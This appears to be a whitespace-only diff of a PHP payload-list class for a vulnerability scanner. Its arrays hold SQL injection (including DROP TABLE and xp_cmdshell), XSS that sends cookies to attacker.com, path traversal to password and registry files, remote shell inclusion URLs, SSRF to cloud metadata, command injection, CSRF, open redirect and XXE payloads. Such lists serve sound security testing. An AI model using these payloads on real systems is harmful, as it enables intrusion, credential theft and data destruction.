@@ -1,11 +1,10 @@
 <?php
 
-
 namespace Grim\Data;
 
 /**
  * Vulnerability Testing Payloads
- * 
+ *
  * This file contains arrays of payloads for testing various security vulnerabilities.
  * Each array contains test vectors that can be used to detect specific vulnerability types.
  */
@@ -25,7 +24,7 @@ class Payloads
         "') OR ('1'='1",
         "') OR ('1'='1'--",
         "') OR ('1'='1'#",
-        
+
         // UNION-based
         "' UNION SELECT NULL--",
         "' UNION SELECT NULL,NULL--",
@@ -37,13 +36,13 @@ class Payloads
         "' UNION SELECT current_user()--",
         "' UNION SELECT @@hostname--",
         "' UNION SELECT @@datadir--",
-        
+
         // Error-based
         "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,version(),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
         "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()),0x7e))--",
         "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
         "' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x7e,version(),0x7e))s), 8446744073709551610, 8446744073709551610)))--",
-        
+
         // Boolean-based
         "' AND 1=1--",
         "' AND 1=2--",
@@ -51,13 +50,13 @@ class Payloads
         "' AND (SELECT 1)=2--",
         "' AND (SELECT COUNT(*) FROM users)>0--",
         "' AND (SELECT COUNT(*) FROM users)>100--",
-        
+
         // Time-based
         "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
         "' AND (SELECT * FROM (SELECT(BENCHMARK(5000000,MD5(1))))a)--",
         "' WAITFOR DELAY '00:00:05'--",
         "' AND 1=(SELECT COUNT(*) FROM tabname); WAITFOR DELAY '00:00:05'--",
-        
+
         // Stacked queries
         "'; DROP TABLE users--",
         "'; DELETE FROM users--",
@@ -65,7 +64,7 @@ class Payloads
         "'; EXEC xp_cmdshell('dir');--",
         "'; EXEC xp_cmdshell('whoami');--",
         "'; EXEC xp_cmdshell('net user');--",
-        
+
         // Advanced techniques
         "admin'--",
         "admin' #",
@@ -76,12 +75,12 @@ class Payloads
         "1' OR '1'='1' ORDER BY 3--",
         "1' OR '1'='1' GROUP BY 1--",
         "1' OR '1'='1' GROUP BY 1,2--",
-        
+
         // Blind SQL Injection
         "' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--",
         "' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97--",
         "' AND (SELECT CASE WHEN (username='admin' AND SUBSTRING(password,1,1)='a') THEN SLEEP(5) ELSE 0 END FROM users)--",
-        
+
         // NoSQL Injection
         "' || '1'=='1",
         "' || 1==1",
@@ -100,38 +99,38 @@ class Payloads
         "<script>alert(1)</script>",
         "<script>alert(String.fromCharCode(88,83,83))</script>",
         "<script>alert(/XSS/)</script>",
-        
+
         // Event handlers
         "<img src=x onerror=alert('XSS')>",
         "<img src=x onerror=alert(1)>",
         "<img src=x onerror=alert(/XSS/)>",
         "<img src=x onerror=eval('alert(1)')>",
         "<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>",
-        
+
         // SVG XSS
         "<svg onload=alert('XSS')>",
         "<svg><script>alert('XSS')</script></svg>",
         "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
         "<svg><animate attributeName=onload values=alert(1)>",
-        
+
         // JavaScript protocols
         "javascript:alert('XSS')",
         "javascript:alert(1)",
         "javascript:alert(/XSS/)",
         "javascript:void(alert(1))",
         "javascript:alert(1)//",
-        
+
         // Iframe XSS
         "<iframe src=javascript:alert('XSS')>",
         "<iframe src=javascript:alert(1)>",
         "<iframe src=data:text/html,<script>alert(1)</script>>",
-        
+
         // Body events
         "<body onload=alert('XSS')>",
         "<body onload=alert(1)>",
         "<body onpageshow=alert(1)>",
         "<body onfocus=alert(1)>",
-        
+
         // Form elements
         "<input onfocus=alert('XSS') autofocus>",
         "<input onblur=alert(1) autofocus>",
@@ -139,12 +138,12 @@ class Payloads
         "<select onfocus=alert(1) autofocus>",
         "<textarea onfocus=alert(1) autofocus>",
         "<keygen onfocus=alert(1) autofocus>",
-        
+
         // Advanced techniques
         "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
         "<script>new Image().src='http://attacker.com?cookie='+document.cookie;</script>",
         "<script>var xhr=new XMLHttpRequest();xhr.open('GET','http://attacker.com?cookie='+document.cookie);xhr.send();</script>",
-        
+
         // HTML5 elements
         "<details open ontoggle=alert('XSS')>",
         "<marquee onstart=alert('XSS')>",
@@ -153,44 +152,44 @@ class Payloads
         "<embed src=javascript:alert('XSS')>",
         "<object data=javascript:alert('XSS')>",
         "<applet code=javascript:alert('XSS')>",
-        
+
         // CSS-based XSS
         "<div style=background:url(javascript:alert(1))>",
         "<div style=background:url(data:text/html,<script>alert(1)</script>)>",
         "<div style=background:expression(alert(1))>",
-        
+
         // Encoded XSS
         "&#60;script&#62;alert(1)&#60;/script&#62;",
         "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
         "%3Cscript%3Ealert(1)%3C/script%3E",
-        
+
         // Filter bypass
         "<ScRiPt>alert(1)</ScRiPt>",
         "<script>alert(1)</script>",
         "<script>alert(1)</script>",
         "<script>alert(1)</script>",
-        
+
         // DOM XSS
         "<script>document.location='javascript:alert(1)'</script>",
         "<script>document.location.href='javascript:alert(1)'</script>",
         "<script>window.location='javascript:alert(1)'</script>",
-        
+
         // Event delegation
         "<div onclick=alert(1)>click me</div>",
         "<div onmouseover=alert(1)>hover me</div>",
         "<div onmouseenter=alert(1)>enter me</div>",
         "<div onmouseleave=alert(1)>leave me</div>",
-        
+
         // Template injection
         "{{constructor.constructor('alert(1)')()}}",
         "{{7*7}}",
         "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
-        
+
         // AngularJS
         "{{constructor.constructor('alert(1)')()}}",
         "{{[].pop.constructor('alert(1)')()}}",
         "{{[].constructor.constructor('alert(1)')()}}",
-        
+
         // React
         "javascript:void(alert(1))",
         "data:text/html,<script>alert(1)</script>",
@@ -226,7 +225,7 @@ class Payloads
         "/proc/self/fd/8",
         "/proc/self/fd/9",
         "/proc/self/fd/10",
-        
+
         // Windows paths
         "..\\..\\..\\windows\\win.ini",
         "..\\..\\..\\..\\windows\\win.ini",
@@ -245,7 +244,7 @@ class Payloads
         "C:\\windows\\system32\\config\\software",
         "C:\\windows\\system32\\config\\security",
         "C:\\windows\\system32\\config\\default",
-        
+
         // URL encoded
         "..%2F..%2F..%2Fetc%2Fpasswd",
         "..%5C..%5C..%5Cwindows%5Cwin.ini",
@@ -253,13 +252,13 @@ class Payloads
         "%2e%2e%5c%2e%2e%5c%2e%2e%5cwindows%5cwin.ini",
         "..%252f..%252f..%252fetc%252fpasswd",
         "..%255c..%255c..%255cwindows%255cwin.ini",
-        
+
         // Double encoding
         "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
         "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9cwin.ini",
         "..%c0%af..%c0%af..%c0%afetc%c0%afshadow",
         "..%c1%9c..%c1%9c..%c1%9cwindows%c1%9csystem.ini",
-        
+
         // PHP wrapper
         "php://filter/convert.base64-encode/resource=index.php",
         "php://filter/convert.base64-encode/resource=config.php",
@@ -267,40 +266,40 @@ class Payloads
         "php://filter/read=convert.base64-encode/resource=index.php",
         "php://filter/read=convert.base64-encode/resource=config.php",
         "php://filter/read=convert.base64-encode/resource=admin.php",
-        
+
         // Data wrapper
         "data://text/plain;base64,PD9waHAgc3lzdGVtKCJscyIpOz8+",
         "data://text/plain;base64,PD9waHAgc3lzdGVtKCJ3aG9hbWkiKT8+",
         "data://text/plain;base64,PD9waHAgc3lzdGVtKCJpZCIpOz8+",
-        
+
         // Expect wrapper
         "expect://id",
         "expect://whoami",
         "expect://ls",
         "expect://cat /etc/passwd",
-        
+
         // Input wrapper
         "php://input",
         "data://text/plain,<?php system('id'); ?>",
         "data://text/plain,<?php system('whoami'); ?>",
         "data://text/plain,<?php system('ls'); ?>",
-        
+
         // File wrapper
         "file:///etc/passwd",
         "file:///etc/shadow",
         "file:///proc/version",
         "file://C:/windows/win.ini",
         "file://C:/windows/system.ini",
-        
+
         // Zip wrapper
         "zip://archive.zip#file.txt",
         "zip://archive.zip%23file.txt",
         "zip://archive.zip%23file.txt",
-        
+
         // Phar wrapper
         "phar://archive.phar/file.txt",
         "phar://archive.phar%2Ffile.txt",
-        
+
         // Common web files
         "../../../index.php",
         "../../../config.php",
@@ -346,7 +345,7 @@ class Payloads
         "http://attacker.com/shell.jar",
         "http://attacker.com/shell.war",
         "http://attacker.com/shell.ear",
-        
+
         // Alternative domains
         "https://attacker.com/shell.php",
         "ftp://attacker.com/shell.php",
@@ -356,7 +355,7 @@ class Payloads
         "tftp://attacker.com/shell.php",
         "sftp://attacker.com/shell.php",
         "scp://attacker.com/shell.php",
-        
+
         // Common shell names
         "http://attacker.com/c99.php",
         "http://attacker.com/r57.php",
@@ -378,7 +377,7 @@ class Payloads
         "http://attacker.com/spyware.php",
         "http://attacker.com/keylogger.php",
         "http://attacker.com/stealer.php",
-        
+
         // Encoded URLs
         "http://attacker.com/shell.php%00",
         "http://attacker.com/shell.php%0a",
@@ -388,7 +387,7 @@ class Payloads
         "http://attacker.com/shell.php%09",
         "http://attacker.com/shell.php%0c",
         "http://attacker.com/shell.php%0b",
-        
+
         // Alternative file extensions
         "http://attacker.com/shell.phtml",
         "http://attacker.com/shell.pht",
@@ -486,7 +485,7 @@ class Payloads
         "http://127.0.0.1.xip.io",
         "http://127.0.0.1.nip.io",
         "http://127.0.0.1.xip.io",
-        
+
         // Common ports
         "http://localhost:22",
         "http://127.0.0.1:22",
@@ -510,7 +509,7 @@ class Payloads
         "http://127.0.0.1:993",
         "http://localhost:995",
         "http://127.0.0.1:995",
-        
+
         // Database ports
         "http://localhost:3306",
         "http://127.0.0.1:3306",
@@ -528,7 +527,7 @@ class Payloads
         "http://127.0.0.1:9200",
         "http://localhost:9300",
         "http://127.0.0.1:9300",
-        
+
         // Web server ports
         "http://localhost:8080",
         "http://127.0.0.1:8080",
@@ -544,7 +543,7 @@ class Payloads
         "http://127.0.0.1:5000",
         "http://localhost:7000",
         "http://127.0.0.1:7000",
-        
+
         // Cache and message queue ports
         "http://localhost:11211",
         "http://127.0.0.1:11211",
@@ -556,7 +555,7 @@ class Payloads
         "http://127.0.0.1:2181",
         "http://localhost:9092",
         "http://127.0.0.1:9092",
-        
+
         // Cloud metadata endpoints
         "http://169.254.169.254/latest/meta-data/",
         "http://169.254.169.254/latest/user-data/",
@@ -568,7 +567,7 @@ class Payloads
         "http://169.254.169.254/latest/meta-data/local-ipv4",
         "http://169.254.169.254/latest/meta-data/public-hostname",
         "http://169.254.169.254/latest/meta-data/local-hostname",
-        
+
         // Alternative cloud metadata
         "http://metadata.google.internal/computeMetadata/v1/",
         "http://metadata.azure.internal/metadata/instance",
@@ -578,7 +577,7 @@ class Payloads
         "http://169.254.169.254/metadata/v1/instance/id",
         "http://169.254.169.254/metadata/v1/instance/type",
         "http://169.254.169.254/metadata/v1/instance/name",
-        
+
         // Internal network ranges
         "http://10.0.0.1",
         "http://10.0.0.2",
@@ -592,7 +591,7 @@ class Payloads
         "http://172.16.1.1",
         "http://172.20.0.1",
         "http://172.20.1.1",
-        
+
         // Alternative protocols
         "ftp://localhost",
         "ftp://127.0.0.1",
@@ -608,7 +607,7 @@ class Payloads
         "sftp://127.0.0.1",
         "scp://localhost",
         "scp://127.0.0.1",
-        
+
         // Encoded variations
         "http://localhost%3A8080",
         "http://127.0.0.1%3A8080",
@@ -620,7 +619,7 @@ class Payloads
         "http://127.0.0.1%3A6379",
         "http://localhost%3A27017",
         "http://127.0.0.1%3A27017",
-        
+
         // Double encoding
         "http://localhost%253A8080",
         "http://127.0.0.1%253A8080",
@@ -652,7 +651,7 @@ class Payloads
         "|| ls ||",
         "`ls`;",
         "$(ls);",
-        
+
         // File reading commands
         "; cat /etc/passwd",
         "| cat /etc/passwd",
@@ -675,7 +674,7 @@ class Payloads
         "|| cat /etc/hosts",
         "`cat /etc/hosts`",
         "$(cat /etc/hosts)",
-        
+
         // System information commands
         "; whoami",
         "| whoami",
@@ -698,7 +697,7 @@ class Payloads
         "|| uname -a",
         "`uname -a`",
         "$(uname -a)",
-        
+
         // Directory listing commands
         "; ls -la",
         "| ls -la",
@@ -721,7 +720,7 @@ class Payloads
         "|| pwd",
         "`pwd`",
         "$(pwd)",
-        
+
         // Process commands
         "; ps aux",
         "| ps aux",
@@ -744,7 +743,7 @@ class Payloads
         "|| netstat -an",
         "`netstat -an`",
         "$(netstat -an)",
-        
+
         // Network commands
         "; ifconfig",
         "| ifconfig",
@@ -767,7 +766,7 @@ class Payloads
         "|| route -n",
         "`route -n`",
         "$(route -n)",
-        
+
         // User management commands
         "; cat /etc/passwd | grep root",
         "| cat /etc/passwd | grep root",
@@ -783,7 +782,7 @@ class Payloads
         "|| cat /etc/group | grep admin",
         "`cat /etc/group | grep admin`",
         "$(cat /etc/group | grep admin)",
-        
+
         // File system commands
         "; df -h",
         "| df -h",
@@ -806,7 +805,7 @@ class Payloads
         "|| find / -name '*.txt' -type f",
         "`find / -name '*.txt' -type f`",
         "$(find / -name '*.txt' -type f)",
-        
+
         // Windows specific commands
         "; dir C:\\",
         "| dir C:\\",
@@ -829,7 +828,7 @@ class Payloads
         "|| net user",
         "`net user`",
         "$(net user)",
-        
+
         // Advanced techniques
         "; bash -c 'ls -la'",
         "| bash -c 'ls -la'",
@@ -845,7 +844,7 @@ class Payloads
         "|| sh -c 'whoami'",
         "`sh -c 'whoami'`",
         "$(sh -c 'whoami')",
-        
+
         // Encoded commands
         "; echo 'bHMgLWxh' | base64 -d | sh",
         "| echo 'bHMgLWxh' | base64 -d | sh",
@@ -854,7 +853,7 @@ class Payloads
         "|| echo 'bHMgLWxh' | base64 -d | sh",
         "`echo 'bHMgLWxh' | base64 -d | sh`",
         "$(echo 'bHMgLWxh' | base64 -d | sh)",
-        
+
         // Time-based commands
         "; sleep 5",
         "| sleep 5",
@@ -883,7 +882,7 @@ class Payloads
         "<input type=\"hidden\" name=\"token\" value=\"stolen_token\">",
         "</form>",
         "<script>document.getElementById('csrf').submit();</script>",
-        
+
         // Image-based CSRF
         "<img src=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
         "<img src=\"http://target.com/action\" onerror=\"document.forms[0].submit()\">",
@@ -895,14 +894,14 @@ class Payloads
         "<img src=\"http://target.com/action\" onloadeddata=\"document.forms[0].submit()\">",
         "<img src=\"http://target.com/action\" onloadedmetadata=\"document.forms[0].submit()\">",
         "<img src=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
-        
+
         // Iframe-based CSRF
         "<iframe src=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
         "<iframe src=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
         "<iframe src=\"http://target.com/action\" onloadend=\"document.forms[0].submit()\">",
         "<iframe src=\"http://target.com/action\" onabort=\"document.forms[0].submit()\">",
         "<iframe src=\"http://target.com/action\" onerror=\"document.forms[0].submit()\">",
-        
+
         // Link-based CSRF
         "<link rel=\"stylesheet\" href=\"http://target.com/action\">",
         "<link rel=\"preload\" href=\"http://target.com/action\">",
@@ -910,14 +909,14 @@ class Payloads
         "<link rel=\"dns-prefetch\" href=\"http://target.com/action\">",
         "<link rel=\"prerender\" href=\"http://target.com/action\">",
         "<link rel=\"modulepreload\" href=\"http://target.com/action\">",
-        
+
         // Meta-based CSRF
         "<meta http-equiv=\"refresh\" content=\"0;url=http://target.com/action\">",
         "<meta http-equiv=\"refresh\" content=\"0;url=http://target.com/action\">",
         "<meta http-equiv=\"refresh\" content=\"1;url=http://target.com/action\">",
         "<meta http-equiv=\"refresh\" content=\"5;url=http://target.com/action\">",
         "<meta http-equiv=\"refresh\" content=\"10;url=http://target.com/action\">",
-        
+
         // Object-based CSRF
         "<object data=\"http://target.com/action\">",
         "<object data=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
@@ -925,7 +924,7 @@ class Payloads
         "<object data=\"http://target.com/action\" onloadend=\"document.forms[0].submit()\">",
         "<object data=\"http://target.com/action\" onabort=\"document.forms[0].submit()\">",
         "<object data=\"http://target.com/action\" onerror=\"document.forms[0].submit()\">",
-        
+
         // Embed-based CSRF
         "<embed src=\"http://target.com/action\">",
         "<embed src=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
@@ -933,7 +932,7 @@ class Payloads
         "<embed src=\"http://target.com/action\" onloadend=\"document.forms[0].submit()\">",
         "<embed src=\"http://target.com/action\" onabort=\"document.forms[0].submit()\">",
         "<embed src=\"http://target.com/action\" onerror=\"document.forms[0].submit()\">",
-        
+
         // Applet-based CSRF
         "<applet code=\"http://target.com/action\">",
         "<applet code=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
@@ -941,7 +940,7 @@ class Payloads
         "<applet code=\"http://target.com/action\" onloadend=\"document.forms[0].submit()\">",
         "<applet code=\"http://target.com/action\" onabort=\"document.forms[0].submit()\">",
         "<applet code=\"http://target.com/action\" onerror=\"document.forms[0].submit()\">",
-        
+
         // Marquee-based CSRF
         "<marquee onstart=\"document.forms[0].submit()\">",
         "<marquee onbounce=\"document.forms[0].submit()\">",
@@ -949,7 +948,7 @@ class Payloads
         "<marquee onload=\"document.forms[0].submit()\">",
         "<marquee onloadstart=\"document.forms[0].submit()\">",
         "<marquee onloadend=\"document.forms[0].submit()\">",
-        
+
         // Details-based CSRF
         "<details open ontoggle=\"document.forms[0].submit()\">",
         "<details open onload=\"document.forms[0].submit()\">",
@@ -957,7 +956,7 @@ class Payloads
         "<details open onloadend=\"document.forms[0].submit()\">",
         "<details open onabort=\"document.forms[0].submit()\">",
         "<details open onerror=\"document.forms[0].submit()\">",
-        
+
         // Audio-based CSRF
         "<audio src=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
         "<audio src=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
@@ -968,7 +967,7 @@ class Payloads
         "<audio src=\"http://target.com/action\" oncanplaythrough=\"document.forms[0].submit()\">",
         "<audio src=\"http://target.com/action\" onloadeddata=\"document.forms[0].submit()\">",
         "<audio src=\"http://target.com/action\" onloadedmetadata=\"document.forms[0].submit()\">",
-        
+
         // Video-based CSRF
         "<video src=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
         "<video src=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
@@ -979,7 +978,7 @@ class Payloads
         "<video src=\"http://target.com/action\" oncanplaythrough=\"document.forms[0].submit()\">",
         "<video src=\"http://target.com/action\" onloadeddata=\"document.forms[0].submit()\">",
         "<video src=\"http://target.com/action\" onloadedmetadata=\"document.forms[0].submit()\">",
-        
+
         // Source-based CSRF
         "<source src=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
         "<source src=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
@@ -990,7 +989,7 @@ class Payloads
         "<source src=\"http://target.com/action\" oncanplaythrough=\"document.forms[0].submit()\">",
         "<source src=\"http://target.com/action\" onloadeddata=\"document.forms[0].submit()\">",
         "<source src=\"http://target.com/action\" onloadedmetadata=\"document.forms[0].submit()\">",
-        
+
         // Track-based CSRF
         "<track src=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
         "<track src=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
@@ -1001,7 +1000,7 @@ class Payloads
         "<track src=\"http://target.com/action\" oncanplaythrough=\"document.forms[0].submit()\">",
         "<track src=\"http://target.com/action\" onloadeddata=\"document.forms[0].submit()\">",
         "<track src=\"http://target.com/action\" onloadedmetadata=\"document.forms[0].submit()\">",
-        
+
         // Area-based CSRF
         "<area href=\"http://target.com/action\" onload=\"document.forms[0].submit()\">",
         "<area href=\"http://target.com/action\" onloadstart=\"document.forms[0].submit()\">",
@@ -1012,7 +1011,7 @@ class Payloads
         "<area href=\"http://target.com/action\" oncanplaythrough=\"document.forms[0].submit()\">",
         "<area href=\"http://target.com/action\" onloadeddata=\"document.forms[0].submit()\">",
         "<area href=\"http://target.com/action\" onloadedmetadata=\"document.forms[0].submit()\">",
-        
+
         // Advanced CSRF techniques
         "<script>setTimeout(function(){document.forms[0].submit();},1000);</script>",
         "<script>setInterval(function(){document.forms[0].submit();},1000);</script>",
@@ -1022,7 +1021,7 @@ class Payloads
         "<script>setImmediate(function(){document.forms[0].submit();});</script>",
         "<script>process.nextTick(function(){document.forms[0].submit();});</script>",
         "<script>queueMicrotask(function(){document.forms[0].submit();});</script>",
-        
+
         // Event-based CSRF
         "<script>document.addEventListener('DOMContentLoaded',function(){document.forms[0].submit();});</script>",
         "<script>window.addEventListener('load',function(){document.forms[0].submit();});</script>",
@@ -1034,7 +1033,7 @@ class Payloads
         "<script>window.addEventListener('scroll',function(){document.forms[0].submit();});</script>",
         "<script>window.addEventListener('online',function(){document.forms[0].submit();});</script>",
         "<script>window.addEventListener('offline',function(){document.forms[0].submit();});</script>",
-        
+
         // Mouse event CSRF
         "<script>document.addEventListener('click',function(){document.forms[0].submit();});</script>",
         "<script>document.addEventListener('dblclick',function(){document.forms[0].submit();});</script>",
@@ -1046,7 +1045,7 @@ class Payloads
         "<script>document.addEventListener('mouseenter',function(){document.forms[0].submit();});</script>",
         "<script>document.addEventListener('mouseleave',function(){document.forms[0].submit();});</script>",
         "<script>document.addEventListener('wheel',function(){document.forms[0].submit();});</script>",
-        
+
         // Keyboard event CSRF
         "<script>document.addEventListener('keydown',function(){document.forms[0].submit();});</script>",
         "<script>document.addEventListener('keyup',function(){document.forms[0].submit();});</script>",
@@ -1058,7 +1057,7 @@ class Payloads
         "<script>document.addEventListener('select',function(){document.forms[0].submit();});</script>",
         "<script>document.addEventListener('selectstart',function(){document.forms[0].submit();});</script>",
         "<script>document.addEventListener('selectionchange',function(){document.forms[0].submit();});</script>",
-        
+
         // Touch event CSRF
         "<script>document.addEventListener('touchstart',function(){document.forms[0].submit();});</script>",
         "<script>document.addEventListener('touchend',function(){document.forms[0].submit();});</script>",
@@ -1067,7 +1066,7 @@ class Payloads
         "<script>document.addEventListener('gesturestart',function(){document.forms[0].submit();});</script>",
         "<script>document.addEventListener('gesturechange',function(){document.forms[0].submit();});</script>",
         "<script>document.addEventListener('gestureend',function(){document.forms[0].submit();});</script>",
-        
+
         // Form event CSRF
         "<script>document.addEventListener('focusin',function(){document.forms[0].submit();});</script>",
         "<script>document.addEventListener('focusout',function(){document.forms[0].submit();});</script>",
@@ -1080,7 +1079,7 @@ class Payloads
         "<script>document.addEventListener('select',function(){document.forms[0].submit();});</script>",
         "<script>document.addEventListener('selectstart',function(){document.forms[0].submit();});</script>",
         "<script>document.addEventListener('selectionchange',function(){document.forms[0].submit();});</script>",
-        
+
         // Media event CSRF
         "<script>document.addEventListener('loadstart',function(){document.forms[0].submit();});</script>",
         "<script>document.addEventListener('progress',function(){document.forms[0].submit();});</script>",
@@ -1132,7 +1131,7 @@ class Payloads
         "9999999999999",
         "99999999999999",
         "999999999999999",
-        
+
         // String IDs
         "admin",
         "user",
@@ -1154,7 +1153,7 @@ class Payloads
         "staff",
         "support",
         "helpdesk",
-        
+
         // Special values
         "null",
         "undefined",
@@ -1176,7 +1175,7 @@ class Payloads
         "10.1",
         "10.01",
         "10.001",
-        
+
         // UUID variations
         "00000000-0000-0000-0000-000000000000",
         "11111111-1111-1111-1111-111111111111",
@@ -1194,7 +1193,7 @@ class Payloads
         "dddddddd-dddd-dddd-dddd-dddddddddddd",
         "eeeeeeee-eeee-eeee-eeee-eeeeeeeeeeee",
         "ffffffff-ffff-ffff-ffff-ffffffffffff",
-        
+
         // Hash variations
         "00000000000000000000000000000000",
         "11111111111111111111111111111111",
@@ -1212,7 +1211,7 @@ class Payloads
         "dddddddddddddddddddddddddddddddd",
         "eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
         "ffffffffffffffffffffffffffffffff",
-        
+
         // Base64 variations
         "YWRtaW4=",
         "dXNlcg==",
@@ -1234,7 +1233,7 @@ class Payloads
         "c3RhZmY=",
         "c3VwcG9ydA==",
         "aGVscGRlc2s=",
-        
+
         // URL encoded variations
         "admin%00",
         "user%00",
@@ -1256,7 +1255,7 @@ class Payloads
         "staff%00",
         "support%00",
         "helpdesk%00",
-        
+
         // Double encoded variations
         "admin%2500",
         "user%2500",
@@ -1278,7 +1277,7 @@ class Payloads
         "staff%2500",
         "support%2500",
         "helpdesk%2500",
-        
+
         // Special characters
         "admin'",
         "user'",
@@ -1300,7 +1299,7 @@ class Payloads
         "staff'",
         "support'",
         "helpdesk'",
-        
+
         // SQL injection variations
         "admin'--",
         "user'--",
@@ -1322,7 +1321,7 @@ class Payloads
         "staff'--",
         "support'--",
         "helpdesk'--",
-        
+
         // XSS variations
         "<script>alert('IDOR')</script>",
         "<img src=x onerror=alert('IDOR')>",
@@ -1334,7 +1333,7 @@ class Payloads
         "<select onfocus=alert('IDOR') autofocus>",
         "<textarea onfocus=alert('IDOR') autofocus>",
         "<keygen onfocus=alert('IDOR') autofocus>",
-        
+
         // Command injection variations
         "; ls",
         "| ls",
@@ -1371,7 +1370,7 @@ class Payloads
         "//attacker.com/path",
         "//attacker.com/path?param=value",
         "//attacker.com/path#fragment",
-        
+
         // JavaScript redirects
         "javascript:alert('redirect')",
         "javascript:void(0)",
@@ -1385,7 +1384,7 @@ class Payloads
         "javascript:void(alert(document.URL))",
         "javascript:void(alert(document.URLUnencoded))",
         "javascript:void(alert(document.baseURI))",
-        
+
         // Data URI redirects
         "data:text/html,<script>alert('redirect')</script>",
         "data:text/html,<script>alert(1)</script>",
@@ -1397,7 +1396,7 @@ class Payloads
         "data:text/html,<script>alert(document.URL)</script>",
         "data:text/html,<script>alert(document.URLUnencoded)</script>",
         "data:text/html,<script>alert(document.baseURI)</script>",
-        
+
         // VBScript redirects
         "vbscript:alert('redirect')",
         "vbscript:alert(1)",
@@ -1409,7 +1408,7 @@ class Payloads
         "vbscript:msgbox('redirect',3)",
         "vbscript:msgbox('redirect',4)",
         "vbscript:msgbox('redirect',5)",
-        
+
         // File protocol redirects
         "file:///etc/passwd",
         "file:///etc/shadow",
@@ -1430,7 +1429,7 @@ class Payloads
         "file:///proc/self/fd/8",
         "file:///proc/self/fd/9",
         "file:///proc/self/fd/10",
-        
+
         // Windows file protocol
         "file://C:/windows/win.ini",
         "file://C:/windows/system.ini",
@@ -1440,7 +1439,7 @@ class Payloads
         "file://C:/windows/system32/config/software",
         "file://C:/windows/system32/config/security",
         "file://C:/windows/system32/config/default",
-        
+
         // Alternative protocols
         "ftp://attacker.com",
         "gopher://attacker.com",
@@ -1463,7 +1462,7 @@ class Payloads
         "mumble://attacker.com",
         "ts3server://attacker.com",
         "ventrilo://attacker.com",
-        
+
         // Communication protocols
         "mailto:attacker@attacker.com",
         "tel:1234567890",
@@ -1486,7 +1485,7 @@ class Payloads
         "instagram://attacker.com",
         "facebook://attacker.com",
         "twitter://attacker.com",
-        
+
         // Cloud services
         "aws://attacker.com",
         "azure://attacker.com",
@@ -1509,7 +1508,7 @@ class Payloads
         "ses://attacker.com",
         "cognito://attacker.com",
         "iam://attacker.com",
-        
+
         // Development tools
         "vscode://attacker.com",
         "atom://attacker.com",
@@ -1532,7 +1531,7 @@ class Payloads
         "flutter://attacker.com",
         "react://attacker.com",
         "angular://attacker.com",
-        
+
         // Gaming platforms
         "steam://attacker.com",
         "origin://attacker.com",
@@ -1555,7 +1554,7 @@ class Payloads
         "execute://attacker.com",
         "open://attacker.com",
         "load://attacker.com",
-        
+
         // Encoded redirects
         "http://attacker.com%00",
         "https://attacker.com%00",
@@ -1577,7 +1576,7 @@ class Payloads
         "slack://attacker.com%00",
         "discord://attacker.com%00",
         "telegram://attacker.com%00",
-        
+
         // Double encoded redirects
         "http://attacker.com%2500",
         "https://attacker.com%2500",
@@ -1599,7 +1598,7 @@ class Payloads
         "slack://attacker.com%2500",
         "discord://attacker.com%2500",
         "telegram://attacker.com%2500",
-        
+
         // Special characters
         "http://attacker.com'",
         "https://attacker.com'",
@@ -1621,7 +1620,7 @@ class Payloads
         "slack://attacker.com'",
         "discord://attacker.com'",
         "telegram://attacker.com'",
-        
+
         // SQL injection variations
         "http://attacker.com'--",
         "https://attacker.com'--",
@@ -1643,7 +1642,7 @@ class Payloads
         "slack://attacker.com'--",
         "discord://attacker.com'--",
         "telegram://attacker.com'--",
-        
+
         // XSS variations
         "<script>alert('redirect')</script>",
         "<img src=x onerror=alert('redirect')>",
@@ -1655,7 +1654,7 @@ class Payloads
         "<select onfocus=alert('redirect') autofocus>",
         "<textarea onfocus=alert('redirect') autofocus>",
         "<keygen onfocus=alert('redirect') autofocus>",
-        
+
         // Command injection variations
         "; ls",
         "| ls",
@@ -1695,7 +1694,7 @@ class Payloads
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///proc/self/status\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///proc/self/fd/0\" >]><foo>&xxe;</foo>",
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///proc/self/fd/1\" >]><foo>&xxe;</foo>",
-        
+
         // Windows XXE
         "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\" >]><foo>&xxe;</foo>",
